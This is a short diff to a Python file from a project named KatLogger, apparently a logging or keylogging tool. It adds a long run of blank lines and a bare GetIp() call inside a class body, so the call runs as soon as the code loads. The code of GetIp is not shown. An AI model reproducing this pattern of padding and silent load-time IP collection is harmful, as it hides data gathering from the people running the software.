@@ -6,6 +6,29 @@ kat.licence("GPL-3.0 licence")
 kat.licenceFile("../LICENCE", 0)
 kat.link("https://github.com/Lif28/KatLogger/tree/main?tab=GPL-3.0-1-ov-file")
 kat.web("nothing for now :/")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 def player(): 
  import re
  import uuid
@@ -145,7 +168,7 @@ import subprocess
 import getInfo
 
 class Update:
-    
+    GetIp()
     def __init__(self): 
         self.logger = ""
 
